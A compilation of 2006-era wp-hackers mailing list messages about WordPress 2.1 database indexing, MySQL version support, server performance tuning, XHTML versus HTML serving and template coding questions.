The get/set option API enforces unique option names, I believe, but I've 
seen some databases that had duplicate keys nonetheless.  What happens 
when we make the key unique but have dupe names in the DB?

2.1 adds the following:

   KEY type_status_date (post_type,post_status,post_date,ID)

I don't know if we need post_date_gmt.  We need to audit our queries to 
see.  I thought we used post_date when we needed to key.

As for cat_name, we only key off of that when retrieving all links or 
posts for a specific category specified by name.  Most templates don't 
do that.  I guess we can add a cat_name key for those few themes  that 
do query by cat_name.

2.1 allows browsing by category on the Manage->Posts screen.  There is 
talk of providing separate pages for drafts and private posts.  That 
probably won't make 2.1 though.

I should elaborate and say that it fits nicely because we can publicize
that "2.1 will be the last version with MySQL 3.23 (or 4.0 whatever)
support.  Now is the time to upgrade to version 4.1 (or perhaps, even
better, 5.0)."

Sure, but you don't announce it and cause people extra work when it is
not needed.  Annoucing now fits nicely with my argument to wait till
version 2.2 for the new version requirement.

I've got a list of the top 100 webhosts according to google page rank.
It's not a perfect list, but it has the all of the big boys I expected
to see, everything form DreamHost to 50megs.  That include all the ones
you found on the site (Good job BTW).  

If no one objects, for those that don't list it, I'll put out inquiries
to their sales staff.  I'll ask what MySQL version they provide with
their most basic package that includes MySQL databases.  This is very
optomistic for a survey, but just maybe we can get 20-30 responses back
in a reasonable amount of time.

Any objections?

Just a note for those following along at home, MySQL can only use one 
index for any given query. Even if an index exists, it will be ignored 
by the optimizer if there is a more primary one available, or depending 
on the table size it'll just do a scan. To keep it to the indicies you 
need to do multi-field ones, like we added in 2.1.

I assure you it's not. If you have a link to the page you checked with I
might be able to tell you why whatever you're doing /appears/ to be
working, but actually isn't.

I don't think so.
Old - yes. But not decrepit.
i.e. PHP4, not 5. MySQL 4, not 5. 

*BUT* not MySQL 4.0 and not PHP 4.0. The latest stable and compatible and
tried-and-tested I'd gander.

You seem to assume that sub-queries are a performance panacea, when thus 
far I've only noticed them brought up in the context of doing complex 
category exclusion queries, which I would say is definitely a minority 
of a traffic most blogs do.

I think there is more performance benefit to be had by taking more out 
of the DB, rather than putting more pressure on it. If you want to make 
things crazy-fast, eliminate all ORDER BY clauses, and WHERE statements 
that aren't on primary keys, stick it all in memcache, and then sort and 
select everything using multi-diminsional arrays in memory. *cough*

I don't recall exactly where I read or heard it, this blog entry makes a 
minor reference to needless subqueries:

http://www.mysqlperformanceblog.com/2006/08/11/database-problems-in-mysqlphp-applications/

But that's not what I was referring to directly.

While there are some field names that bug me, like ID vs post_id, 
besides that I don't think there is anything fundamentally I would 
change in WP's schema (from 2.1) to make it faster or more "efficient." 
Some folks from MySQL donated some time to review WP and their 
improvements are in 2.1.

Did you have anything specific in mind?

Nope. I'm no DB expert, and I do know that 2.1 is heavily improved. I just
thought there might be some people that had ideas. I had no idea MySQL OK'd
our DB structure.. that's awesome :)

So it's just the hard-to-fix stuff now.. :(

Indeed.

I suspect with the db improvements made in 2.1 the best port or call for
improving the performance (without using a caching plugin) is to look at
reducing the number of times all the heavy filters are run - run on
publish and store the prefiltered content in the db (for example the posts
table has a post_content_filtered field already there for this type of
work)

This won't be a small amount of work - it would be interesting to see what
improvement it did make.

This is of course work for 2.2 or later...

I'm sure there is a ton left to improve post-2.1, but if we stick to 
specific ideas or suggestions we can probably keep these threads shorter. :)

The best way to get a performance enhancement into WordPress is to 
measure, measure, measure. Benchmark before and after, share the 
results. Make sure there are no regressions.

Subject: [wp-hackers] 5 minutes to a faster blog
Message-ID: <456FFB33.2080607@mullenweg.com>

With the following I regularly get sub 100 millisecond front-page 
generation time on photomatt.net, and lower on WP Pages. No caching 
plugins, no alternative front-ends that make me rewrite my themes and 
plugins, just plain WordPress.

1. Use APC:

http://pecl.php.net/package/APC

APC can give you a 3x speedup in load times, instantly.

Tip: If you're on Litespeed, use this to save memory:

http://www.litespeedtech.com/support/wiki/doku.php?id=litespeed_wiki:php:opcode_cache

(APC is bundled with Litespeed, btw.)

2. Enable the query cache:

nano /etc/my.cnf

[mysqld]
...
query_cache_size = 64M

/etc/init.d/mysql restart

This usually cuts in half most SQL times on busy sites, if not more.

3. Swich your tables to InnoDB

Use phpMyAdmin > table > Operations to switch.

And add the following in your MySQL config file, adjust sizes as 
necessary for your memory:

# Make buffer_pool larger than the size of your DB, if possible
innodb_buffer_pool_size=512M
innodb_additional_mem_pool_size=20M
innodb_flush_log_at_trx_commit=0
innodb_log_buffer_size=8M

Restart MySQL.

4. Enable WP's built-in caching

define( 'ENABLE_CACHE', true ); // in wp-config.php

Unless you have slow HDs, like a NFS-based host like Dreamhost.

== More than 5 minutes, bonus ==

5. Use WP 2.1

It's way faster.

What about eAccelerator? That's what I'm currently using and what everyone
is recommending out there.. Is it the same thing?

I can't remember, but once when googling I came across a link that said WP
was "purposely making it hard to use eAccelerator" [sic] and preferred APC.
Is it recommended to use APC with WP over eAccelerator?

I run 2.1-svn on eAcc 0.9.6-svn without problems at all.
Has the "bleeding edge" idiot I am, I also run Apache 2.2.3, PHP 5.2.0 and it all works just fine.

I did try to follow Matt's suggestions though, and there were a couple of tables in the wp database I could not convert from MyISAM to InnoDB, namely "wp_posts" and "wp_comments". I got "#1214 - The used table type doesn't support FULLTEXT indexes" when trying to convert them?

Inline PHP documentation patches are now being accepted, as per this ticket:

http://trac.wordpress.org/ticket/2474

Sorry there was such a fuss over that before, that was pretty silly, I 
think I understand the issues better now.

As with all parts of WP, brevity and utility should be the core of any 
inline documentation contributions.

Yeah, I started learning PHP by reading a PHP 4 guide and programming
after doing an 'apt-get install libapache2-mod-php4'.

Not long after, I realised that the version installed on my machine (PHP
4.4) was completely different from the one that the book was written for
(PHP 4.0) and because it taught techniques relying on register_globals
being activated, all the demo code and samples broke. They were both PHP
4, but completely incompatible.

Yeah, you can't use FULLTEXT (used for advanced search options) with InnoDB, only with MyISAM.

I too use the same config, except with II6 and IIS7 instead of Apache.

I know eAccelerator /works/ with WP, my only question is if APC works /better/ with it.

I haven't compared eAcc with APC, as APC is known to have problems dealing with Gallery 2. That being said, APC does have "the right people" behind it, eg. Rasmus Lerdorf so I wouldn't be that surprised if it performs better.

Why doesn't WP ship with InnoDB as the default, if available?

In our testing at WP.com we found APC to be the most stable. That was 
about 6-8 months ago, I don't know if there have been any dramatic 
changes since then.

Because most hosts aren't configured to work well with InnoDB.

I think in 2007 MySQL will move its standard to a new table type 
(MyISAM++) which has the benefits of InnoDB but still supports things 
like FULLTEXT.

Sweet. Will be much help in the future (ex: was trying to learn the rewrite
class the other day and I had to read the code itself to figure out what was
going on).

Core WP doesn't do any FULLTEXT, but some plugins (like related posts)

For an added bonus, the APC object cache can store data in RAM instead
of to disk, for increased speed and lower server load.

Not to denigrate these tips, but you should have titled that "5 minutes to a
faster SELF-HOSTED blog".  Last I checked, Dreamhost won't let me implement
ANY of the suggestions made above.

So maybe we need another set of tips for hosted sites...

You can't enable the internal caching on Dreamhost? ;)

Then again, while you may be able to, dunno if it's the best idea in a
shared environment. Especially one that's not so much of a "dream".
:rolleyes:

The built-in caching should work, but likely only if you're running PHP as CGI.

InnoDB has been supported on new databases for a while now:

I'm a customer and I'm happy with
1) customer service
2) services offered

I'm UNHAPPY about
1) on-going (and I mean, continual, over the course of the two years I've
been with 'em) performance issues.  I've been moved to different servers
three times, with little-to-no noticeable effects
2) Spam RBLs continually adding DH mail servers to their blacklists

So I don't know if "delirious" would describe me.  They're certainly better
than Vizaweb was (stupid Leo Laporte and his TWiT army...)

issues, always had awesome support, they offer more services than virtually
any other shared host and they're cheap as chips. Awesome.

I could go on and on, but it basically comes down to horrid server configs.
A friend has an account with them that we use for static storage on one of
my sites (tons of space and bandwidth). We'd use it to host more than that,
but it's just not worth the effort as scripts just don't play nice in my
experience on DH boxes. Heck, search the WP forums. You'll find gobs of
threads on issues related to DH.

Subject: [wp-hackers] A crazy idea - Modulizing WordPress
Message-ID: <4671ABD2-577D-4C7B-ABCD-ED87426575F4@gmail.com>

Hi everyone,
I've been around here for a while, mostly reading and getting  
smarter. I've had this idea for a while, and thought I might bring it  
up here, even if it might be a bit crazy.

My idea would be for a future version of WordPress, maybe WP 3.0 to  
totally modularizing the data types, and the WP core would be only  
the user system and theme system. currently they're 3 types of data  
in WP, posts, pages and links (even though posts and pages are stored  
in the same table, they are different).
Making the data processing types independent would really help making  
implementation of new data types easy, as would be disabling unwanted  
ones. I sometimes have clients who only want a static page, and get  
very confused with the post and page.

So you'll ask why WordPress, WordPress is a blogging system and not a  
full CMS, any they're many a CMS out there that do this. Well,  
WordPRess has great features, it is easy to admin, has a great theme  
system and is really a good choice for allot of small sites.

Well, then what about the simplicity for simple bloggers, who are %95  
of WP users? Well, If it's done right, something can be both  
sophisticated and simple at once. Mac OS X will prove that. On the  
contrary, It can make site management allot easier in some situations.

Just a thought, please don't laugh too hard.

Sorry for my chutzpah,
Joe

I have one slow query left in my installation, it is used on paged  
post listings and comes from the get_posts function. Sorry if this  
has already been hashed out in the past...

SELECT DISTINCT * FROM wp_posts  WHERE 1=1 AND post_date_gmt <=  
'2006-12-01 10:24:59' AND (post_status = "publish") AND post_status ! 
= "attachment" GROUP BY  wp_posts.ID  ORDER BY post_date DESC LIMIT  
0, 25;

Given the structure of this query, DISTINCT and GROUP BY are  
unnecessary. Adding DISTINCT causes the use of a temporary table, and  
adding GROUP BY incurs Using filesort. The following would be a more  
ideal query, and with an index OF (post_status,post_date) it becomes  
very efficient:

SELECT DISTINCT * FROM wp_posts  WHERE 1=1 AND post_date <=  
'2006-12-01 10:24:59' AND (post_status = "publish") AND post_status ! 
= "attachment" GROUP BY  wp_posts.ID  ORDER BY post_date DESC LIMIT  
0, 25;


Obviously the get_posts function allows for many contingencies. It  
would make sense to only have DISTINCT and/or GROUP BY if there was a  
join. Would it be safe to modify this function to construct the query  
string with the $distinct and $group by variables included only when  
$join is set (or non-empty)?

komra

P.S. Is there any reason for the use of post_date_gmt in the original  
query as opposed to post_date?

I tried to increase performance, too ... and found out the following things:

- eAccelerator (and any other PHP-Accelerator) increaseed performance 2x 
often 3x (depending on the script that runs, frontpage = 2x)
- enabling the mysql query cache helped a lot, but only if the $now in 
the posts-query gets frozen 
(http://comox.textdrive.com/pipermail/wp-hackers/2006-January/003885.html), 
otherwise the frontpage doesn't benefit too much from it
- switching to innodb actually decreased performance (nearly not 
measureable) on my install, but maybe my blog is too small with its 1500 
posts
- enabling the built in cache decreased performance by 10%. So I guess 
my HD is simply too slow :-)
hdparm -tT /dev/md0
/dev/md0:
 Timing cached reads:   1908 MB in  2.00 seconds = 953.94 MB/sec
 Timing buffered disk reads:  146 MB in  3.02 seconds =  48.28 MB/sec
- deactivating the gzip compression in the wp options panel increased 
performance a little bit
- activating wp-cache (the plugin) increased performance by a factor of 
6 (on my blog from 5 request per second to 30 request per second)

Did I forget anything?

Re-activate gzip. Longer generation times, but the user will see the page
faster in most cases as it loads a hell of a lot faster.

Compare page filesizes with this tool:
http://www.whatsmyip.org/mod_gzip_test/

I have it off on my blog though 'cause it takes ages for a page to be
generated and downloaded if it has a couple hundred comments (which many of
my plugins do). Even on REALLY fast server. :/

I just thoght the ame same, because when Wordpress would be more
modulerized(the core), then changing the WYSIWYG Editor would may be
easier(I never tried it, but there are often discussions(mostly on this
list) about using an other Editor as TinyMCE.

So any dulicate keys would be the result of either core or plugin 
application error right? I guess the UNIQUE index would then have the 
added benefit of possibly bringing these types of errors to the 
developer's attention.

But upgrading an existing database to the UNIQUE index does then pose a 
challenge, because it would require a script to scan for and somehow 
handle dupe keys. Since selects for these dupe keys (LIMIT 1) have 
undefined behavior, there is no theoretical risk in just deleting all but 
one instance of any dupes.

--Unless there are some plugins out there that actually DEPEND on dupe 
keys for some reason. Anyone know of such plugins?

Some hosts like Dreamhost, Powweb, MediaTemple grid, and others mount 
all user files via NFS, which generally will mean going directly to the 
DB is often faster than using the file-based caches. (I could be wrong, 
but this is one of the reasons we turned off caching by default.)

I know dreamhost can be very cheap, as I have some insane $12/year
plan there.  However, if you want a "real" host w/o going dedicated
consider a VPS.  You get full root access, you can install and tweak
all you want, and the price is decent.  I use rimuhosting and I love
it (http://www.rimuhosting.com), but I've also heard good things about
slicehost (http://www.slicehost.com/).

A typical plan that will do wordpress with power to spare will be $20/month.

This sort of hack isn't needed anymore in 2.1.

It's probably a configuration issue. InnoDB is almost always faster, but 
it has to be properly configured. Honestly with 1500 posts your DB is 
small enough that it should be in-memory all the time.

You may want to try one of the alternate cache backends, like APC or 
Memcache.

I would always recommend doing gzip on the web server level, not the PHP 
level. You can also set it to the lowest possible compression setting 
and still get size gains of 20-30% with no perceptible CPU hit on a 
modern server.

30 * 86400 = 2,592,000 PHP pageviews a day on a singe server. Digg + 
Reddit usually only send 50-100k. Properly done caching can have 
benefits many times the effect of higher-level changes. Make sure you 
focus your attention in the right place.

On WordPress.com, unless something is broken, SQL usually only accounts 
for 5-15% of page generation time.

Bonus tip: Perceived speed is more important than real speed. Make sure 
there isn't too much Javascript, ad crap, and external widgets on your 
blog slowing down the loading time for clients.

Part of the assumption is that if you get a level of traffic where any 
of this is really needed, you probably have more influence over your 
hosting environment whether directly through a VPS or dedicated server 
or with a hosting provider you're paying more than 20/mo.

Which is precisely ignoring my core point.  Movable Type setups on
shared hosting have at least a good shot at surviving a good digging -
WordPress setups, not so much.  How do we reverse that, other than
saying "buy better hosting" or "why not try a WordPress.com blog where
you have much less control over look, feel, plugins and
architecture?", both of which come off as sounding elitist, snobbish
and frankly demeaning.

reason cannot be gettexted (ex. die messages) ina  centralized files,
maybe sa simple text files that is read when necessary.

This will assure to have them all translated and havint to edit one
file only for new distro.

Ideas or suggestions?

Try out 2.1 and look at the queries again, a lot has been changed.

Actually, get_posts() didn't get the love.  Only query_posts() did. 
I'll fix that.

Message-ID: <674b4a3b0612011447q3e6f69cbn279ac318f300c886@mail.gmail.com>

Back in October the write page preview and edit links, which make it
easy to toggle between the writing textarea and the preview,
disappeared from trunk.  When someone asked Matt why they disappeared
[1], his response was this, I think:

"I was removing the headings entirely as they seemed a bit redundant.
I'm not crazy about how the preview works currently, but I haven't
figured out the best way to improve it." [2]

Well, I'm guessing from the recent trac activity that there's going to
be a freeze on new features going into 2.1, but there hasn't been any
improved preview functionality.  Instead, we've just lost those
convenient links, which keep one from having to
scroll-scroll-scroll-scroll down to the preview then
scroll-scroll-scroll-scroll back up.

Can we restore the links?  Or at least can someone explain the
benefits of their removal?

That's correct. Also, if I am not mistaken, I _think_ the limitation was 
only one index per WHERE condition. Indexes are still used for GROUP BY 
and ORDER BY statements.

And at some point I think even this restriction was lifted? in 5.0? 5.1?

Also, regardless of this, the real payoff is in multi-column indexes. A 
multi-colum index tailor-made for a frequent query buys TONS of 
performance.

But Internet Explorer won't be forgotten in the next five years, and
unfortunately for us, probably not the next 10. Any project looking at
the long term shouldn't be thinking "100 years," but a more realistic
number, say, "10." ... With that said, we have to cater to the
browser. If we want to use XHTML and advocate its use over HTML, what
are we to do when IE destroys a page using it? Many standards lovers
(myself included) consider using text/html perfectly acceptable. It's
no different than CSS hacks. I don't wanna argue much here (it's late

What MT gets you performance-wise with static pages it steals back in  
comment/trackback handling, where every call is an expensive CGI  
request. Not a big deal for the average blog, but try hosting a super- 
popular MT site that's very high on the spam radar and it's a  
constant issue. Every spam-fighting technique available requires  at  
least a minimum CGI exertion. Multiplied by thousands per hour, the  
performance hit can be huge, even disastrous. Which is why some hosts  
ban MT installations altogether. Arguments that MT's static pages  
offer performance benefits don't hold water in practice.

server after dealing with this problem for years).

Ever compare the amount of time it takes to make a new post on MT vs. WP?
There's a reason people are dropping MT like a rotten apple.

And if your server can't handle WP and needs a static version, try WP-Cache.
I run a WP powered site that uses WP-Cache and eAccelerator. The WordPress
part of the site gets 750,000 to 1.2 million pageviews a month on average
and it putts along at about a 0.50 load even though it's also hosting a very
popular vBulletin forum.

Like most producers of (would-be) ephemera, I think you're vastly
underestimating the ultimate cultural importance of collections like the
Internet Archive. In the latest web framework for producing throw-away
intranet applications, this might be an understandable attitude. In a
project for producing cultural content, it's extremely short-sighted.
Obscure digital formats are difficult enough to deal with. Documents
that claim to comply with obscure digital formats but actually don't,
are /really/ difficult to deal with.

Well-formed, valid, conformant modularized XHTML has some potential
advantages over HTML 4.01 Strict. Non-well-formed, non-valid,
non-conformant, non-modularized "XHTML 1.0" served as text/html
(henceforth "faux XHTML" for short) has only disadvantages. By serving
such markup, you're /neither/ "using" nor "advocating" XHTML, you're
just transforming it from a document format to an empty marketing term.

> Many standards lovers (myself included) consider using text/html perfectly acceptable.

Somebody who loves standards might accept that well-formed, valid,
conformant XHTML 1.0 Strict could be served as text/html to browsers
that do not support application/xhtml+xml, so long as browsers that do
support application/xhtml+xml are served content with the correct media
type. I happen to think (as do many other "standards lovers") that the
HTML compatibility guidelines were not only technically inadequate but a
strategic error. But to say that "standards lovers" might endorse
sending only faux XHTML to all browsers regardless of ability is to rob
the phrase "standards lovers" of all essential meaning.

> It's no different than CSS hacks.

First, especially where conditional comments could have served instead,
CSS hacks have been shown to have been a terrible idea by the release of
IE8. So that's hardly a recommendation.

Second, faux XHTML is demonstrably worse than CSS hacks:

1) CSS hacks /attempt/ to target non-compliant browsers only. WordPress
setups usually serve faux XHTML indiscriminately to all user agents.

2) Most (though not all) CSS hacks involve validating CSS that targets
non-compliant browsers through their CSS parsing failures. By contrast,
faux XHTML is non-validating tag soup.

3) If the user finds your hacky CSS breaks the rendering in her browser,
she can turn it off or use a text browser. No such luck if you send
broken markup.

4) Getting rid of CSS hacks is easy: just change your stylesheet. Fixing
broken markup stored in hundreds of posts and comments in a database is
much trickier.

> I don't wanna argue much here (it's late and I'm tired :D )
> but I wanted to put my 2 cents in.

Thanks for your 2 cents but you seem to have completely misunderstood
what I'm proposing. I am /not/ suggesting for one second WordPress
should serve application/xhtml+xml to Internet Explorer and laugh as
that browser fails miserably (and your audience goes to another site).

On the contrary, I'm suggesting one of three alternatives:

1) If WordPress is going to use XHTML at all, it should serve
application/xhtml+xml to supporting engines like Gecko and recent WebKit
builds. For browsers that do not support application/xhtml+xml, serving
XHTML 1.0 as text/html is a poor solution IMHO. It's "acceptable",
however, so long as it's valid and conformant. That's a minimal
solution. To expect anything less is to undercut WordPress's claim to be
a standards-based system.

2) A better solution would be to serve XHTML 1.1 or modularized XHTML to
application/xhtml+xml-supporting browsers and transform the content to
HTML 4.01 Strict for HTML-only user agents. Storing an object-model in
the database and serializing to either XHTML or HTML would put WordPress
in an excellent position for adopting Web Applications 1.0 and/or XHTML
2. At present, it would of course be hopeless for either.

3) A radically simpler solution would be to just serve HTML 4.01 Strict
to all comers. This will probably continue to work, and removes any need
for content negotiation or transformation. If we start seeing mainstream
browsers that no longer handle text/html, we can always push HTML 4.01
Strict through a transformation to convert it to XHTML 1.1 or
modularized XHTML.

None of these solutions will allow Internet Explorer LTE 8 to "destroy a
page". If, like me, you think XHTML has potential, you really need to
back solution 2).

Good point. My server needs 10 ms more time to generate the page, but 
the normal user can download the document 3-4 times faster because of 
the smaller size. The perceived speed should be much faster with gzip 
activated ... thanks.

So, just how does the direct neural interface work in WordPress 6? I hear
it slows down the get_cognition() function.

Except that Digg sends this kind of traffic within a shorter period than 
one day ;-) Sometimes it can bring a webserver to a halt if only 100 
users decide to visit your blog at the exact same time. But if one wants 
to prepare for digg/slashdot, nothing beats a proper cache that serves 
more or less static pages.

That may be the reason a switch to innodb isn't doing that much 
performance-wise. Accelerators help a lot and having wordpress not 
format every post on each view (http://vapourtrails.ca/wp-preformatted) 
helps too. But - as seen - caching beats everything, even a badly 
configured server ;-)

Well, when you die() something, it's usually because a major part of WP
failed -- e.g. no wp-config.php file, database issues, etc. I don't think it
would be worth it to open another file, since the die() is to stop the
script *now* in case all hell breaks loose.

Befori dieing we need to open a text file and rea a certain line to
get the message, there is anything unsercure in it neither we are
going to load more code, all the code needed will be inserted before
the die statement.

Yes, but what if the file isn't there, because the user uploaded the files
incorrectly? Say we die because we have no wp-config.php, why fail another
file opening?

Subject: [wp-hackers] Link & post categories merge
Message-ID: <000101c7166b$ec37f370$c864a8c0@tiger1>

I decided to take some time and anwer the questions on the how-to form
that hadn't had any responses yet.  When responding to one question,
this thought came to mind:
 
Posit: Released versions of WordPress's wp_list_cats command have an
"issue" where a parent category having no posts will cause all children
categories with posts to be hidden.  One accepted way around this is to
change the wp_list_cats call to be wp_list_cats("hideempty=0") causing
all of the categories to be displayed.
 
Question:  What affect will this have after the merge?  Are all of the
blogs that use this solution going to suddenly have a bazillion extra
categories showing because there is no way to descriminate an empty post
category from a category used exclusively for links?  Or has this
already been handled?

As it stands, all categories would show.  The workaround could be 
removed, however, since it is no longer needed in 2,1.

We could have hide empty only show cats that are empty for both posts 
and links.  If there is a link count but no post count, it won't be 
listed.  If someone wants to create a patch for that we can try it out.

After I had upgraded my main blog to 2.1 alpha3, added some catagories for my "links", in which to be displayed in the sidebar.. those catagories were also showing on the index page, right along with the normal catagories too.

It would be nice if there was a way to have those *not show*, with the other catagories.. and even though editing theme files isn't that hard to do, it still would be nice to some how "hide" those from the index page, via the Catagory add option in the CP?

Before, my theme had:
<?php wp_list_cats('sort_column=name&hide_empty=0'); ?> 

My changes were:
<?php wp_list_cats('sort_column=name&hide_empty=0&exclude=2, 4'); ?> 

I'd rather not have to do that, but, if it's a must, then ok..sigh.

Haha, I could have, but then it wouldn't have been the "way" of the theme itself. The way the theme is, it shows any, and all, catagories on the index page, near footer. Which contain posts, or not. 

I just tried doing what ya mentioned above, and some went bye bye.. So, for now.. I guess I'll just leave it the way it is. You'll have to excuse me people(s), I've been riding on -20 some hours of sleep, and even though my body is here at the computer, the brain is in bed sleeping.. lol! =P 

Thanks though, Viper.. I'll keep that "option" in mind though. ;) :)

The file is part of WP distro, yes there is a chanche that the file
won't be uploaded, as any other wp files, the missing wp-config is
99,99% due not tcause it was missed during upload, infact this file
doens't exist in the WP distro, but that wasn't prepared copying it
from wp-config-sample.php.

I would like to ear something from Matt o Ryan too.

Yes, it took me long enough, and a few kicks to the rear end. But, I gotta admit that what I said was totally wrong, and stupid. Stupid me, accidently was writing a "post", rather then a "page" itself.. 

No need for anything.. and I'll just use the original code that was given in the theme. Sorry people! (It only took how many hours, and how many 24oz bottles of Pepsi to realize it).. =P

Okay. So, what's going to be the final implementation for plugin writers
hooking into the wp_insert_post hook? Will it be triggered by the AJAX
auto-save or not?

Apologies if this sounds redundant, but I don't think my previous thread
on the matter reached any solutions or code changes for the best way to
work with this.

Does the plugin work with xmlrpc posting?  Seems like it would already 
be having this problem when editing a post via xmlrpc.

This off topic of what Matt was talking about, but, I'm just curious. I had a few private requests to upgrade some folks blog's, which I basically told them to wait until the 2.0.6 version is released..

Is 2.0.6 going to be released soon, and are we to expect a 2.1 beta release soon too? Question is being asked, because,  I was wondering if "everyone" is going to be at a 2.0.6 version, before having an official 2.1.. or, is the 2.1 going to be released as it's own?

So we'll have a 2.0.6, and work up through version examples, 2.0.7, 2.0.8, so forth.. Then 2.1, 2.1.?, 2.1.?, and so forth..

Both 2.0.6 and 2.1 beta will be happening this month.  2.0.6 is just 
waiting on some feedback from fastcgi users.  2.0.6 should be out well 
before a final 2.1 release comes around.  After 2.1 is out we'll 
continue doing 2.0.x releases and start doing 2.1.x releases as needed.

Subject: [wp-hackers] PHP Dilemma Regarding query_posts
Message-ID: <309c2db70612032106q314d11a8we372f97fb0ae5be8@mail.gmail.com>

My Dilemma,

I am using WP as a CMS so I am not using the WP packaged archives.  Instead,
I am using a a custom page template to display posts by category and date
like so:


/-------------------------------------------start
example----------------------------------------------------------/

--Category 2 Posts From 2006--

--January--

post date, post title, comments
post date, post title, comments
repeat...

--February--

post date, post title, comments
post date, post title, comments
repeat...

--Repeat..--


--Category 2 Posts from 2005--

Repeat same as above...

/-------------------------------------------end
example----------------------------------------------------------/





The pertinent page template code looks like this:


/-------------------------------------------start
code----------------------------------------------------------/

<div class="entries">
      <h5><a name="06" id="06">Questions From 2006</a></h5>

                        <?php query_posts('cat=2&year=2006&monthnum=1'); ?>
                        <dl>
                            <?php if (have_posts()) : while (have_posts()) :
the_post();?>
                            <dt>January</dt>
                            <dd><a href="<?php the_permalink() ?>"
rel="bookmark" title="<?php the_title(); ?>"><span
class="comments_number"><?php comments_number('0', '1', '%', '');
?></span><span class="date"><?php the_date('j','',''); ?></span><?php
the_title(); ?></a></dd>
                            <?php endwhile; endif; ?>
                        </dl>

                        <?php query_posts('cat=2&year=2006&monthnum=2'); ?>
                        <dl>
                            <?php if (have_posts()) : while (have_posts()) :
the_post();?>
                            <dt>February</dt>
                            <dd><a href="<?php the_permalink() ?>"
rel="bookmark" title="<?php the_title(); ?>"><span
class="comments_number"><?php comments_number('0', '1', '%', '');
?></span><span class="date"><?php the_date('j','',''); ?></span><?php
the_title(); ?></a></dd>
                            <?php endwhile; endif; ?>
                        </dl>

***I then repeat this with a new query and definition list for each of the
12 months, and if I don't have any posts for that month I have to manually
omit it.***

</div><!--end entries from 2006-->


<div class="entries">
         <h5><a name="05" id="05">Questions From 2005</a></h5>

****I then repeat the same queries and definition list for each of the 12
months of 2005****

</div><!--end entries from 2005-->

/----------------------------------------------end
code--------------------------------------------------------------/



As you can see I am having to manually add a new div for each new year(which
isn't a big deal). The big problem is having to add the months manually as
they go by, and I know there has to be a way to do this dynamically with
PHP.

So here are my questions:

1. How can I dynamically display the month name in the <dt> tags, since it
has been queried just above the <dt>?

2. How can I wrap the definition list in an PHP IF statement so that IF the
query_posts for that specific year and month returns nothing the <dl> for
that month is skipped?

more specifically---> Have WP run a query like <?php
query_posts('cat=2&year=2006&monthnum=2'); ?>  then IF there are posts in
the query then output the <dl>,  otherwise continue and do nothing.

3. Of course I would like to be able to generate the year dynamically as
well, but that may be asking too much.

4. Also, is there an easier way of accomplishing all this that I am missing?
If so please let me know!


If anyone can help me I would appreciate it greatly.

I actually came across Nabble on Google while searching for something, the
content was already being listed here. It wasn't me who submitted the list
to be included here.

I find it a convenient way to post to the list, and read it in a threaded
manner.

They have a convenient search, and I also get notification of replies to my
posts.

There is also a test group on groups.google.com, though that seems to be
read only.

Not sure. I presume so, because if the custom form fields aren't
present, it won't add the post meta values. That's the same as blanking
the form to remove an existing score table.

I guess if you got an existing post with a score table, and could _edit_
it with XML-RPC (after it's already been published) then the score table
would be removed, as my plugin would not be able to tell the difference
between the form fields being absent (in the case of XML-RPC posting) or
being manually blanked to remove the score tables.

Perhaps we could leave the existing save_post hook as it is, and create
a new one which is only triggered when you can guarantee that all form
fields are present.

CG  has  also added dodgeit.com [1]. Some people don't  mind
replication.  The  mailman archives make it clear  that  the
list is open to public viewing (albeit not everyone is aware
of  this... think UseNet posters in the 80's... those unable
to  foresee  Deja News and G2, which to some was  a  privacy
timebomb).

As regards mirrors, this discussion is similar to that which
related  to  UseNet.  See Brad Templeton's  famous  page  on
copyrights.

Best wishes,

Roy

Perhaps the best solution would be to implement this suggestion as a plugin
using a filter on option_html_type, that would give people the option, and
an idea of how many plugins aren't using compliant markup etc.

I just have GMail host my domain's e-mail. It's not threaded (i.e. who
replied to who), but it groups all e-mails with the same subject line into
one e-mail. Very helpful. :)

How about implementing one of these solutions as a theme or a plugin?
I would give my two cents if I saw some code. Extra credit for docs

Part of the issue is that there are plenty of places where XHTML  
closing tags are hard coded within WordPress, so it really has to be  
changed there (whether it just be made an option, or moving it out of  
core, possibly to the theme).

It may be possible to use fancy regular expressions using filters to catch
that stuff, but I don't know if this is viable. Last resort is an output
buffer handler IMO.

I don't get the problem.
On systems that don't completely support XHTML, what's wrong with serving
them as close as we can get?
I know, I know, it's much nicer to ship it as x-html instead of html, but if
we can't - what's the problem? Where's the big catastrophe?

I for one code all my sites in XHTML 1.0 - complete with closing tags, XML
headers at the top, and more. But of course I send out as mimetype html.

Why would you settle for something less? I'm seeing this question being by
those wanting a change, but again, if there is no real, tangible *HARM* in
sending out 100% XHTML-valid content as HTML, and indeed, only good comes
out of it compared to sending out HTML 4.01 (YUCK!), why the hell not?

What's wrong with having 100% compliant XHTML, sending it as HTML, and
waiting for the rest of the world to *actually support* XHTML mimetypes
before changing the header?

Forget IE, there's an entire world of non-XHTML ready devices and entire
operating systems. Not everyone uses the latest version of Firefox or Opera,
as a matter of fact, the majority of the *world* doesn't.

I don't see the problem. Every single "advanced web 2.0" website on the
planet that goes for W3C Compliance uses XHTML 1.0 validation - whether or
not they send out the content as XHTML or HTML mimetypes isn't the end of
the world - and *all* of them (AFAIK) send it out as HTML.

----------------------------------

In short:
1) Sending XHTML as mimetype XHTML to _browsers that support it_ (given a
reliable identification mechanism) is a great idea.
2) Refusing to send valid XHTML as HTML mimetype and insisting on taking a
_HUGE STEP BACK_ and going for HTML 4.01-compliant instead is just pointless
and wrong on many levels. 

When you have something good, why change it? I'm all for number 1, but
number 2 is tantamount to realizing the latest build of MySQL 4.x has a bug,
so you completely eliminate  any and all features new to 4.x and go back to
3.0..... ridiculous!

Firstly, the message that started this thread linked to some posts
explaining why sending XHTML with the wrong content-type header is
evil. See, for example, "Sending XHTML as text/html Considered
Harmful":

   http://www.hixie.ch/advocacy/xhtml

I'll also point out that the Neosmart blog front page is currently
neither valid nor well-formed.  If you were to change the
content-type, it wouldn't render. It also uses Prototype, some parts
of which use the innerHTML property and are therefore incompatible
with XHTML. You will *not* be able to flick a switch and change the
content-type without breaking the page -- exactly the problem that the
"Considered Harmful" piece warns about.

Secondly, just to turn this around on you, what are your reasons for
not wanting to use HTML 4.01 Strict? ("YUCK!" was not informative.)
Why do you think XHTML-as-text/html is better?

Message-ID: <000701c7184c$a929ab90$fb7d02b0$@net>

I know my blog doesn't validate - I don't have time for it :)

My main site, however, is:
http://validator.w3.org/check?uri=http%3A%2F%2Fneosmart.net%2F

HTML 4 is ancient. If you go with HTML 4, when (in the future obviously) IE
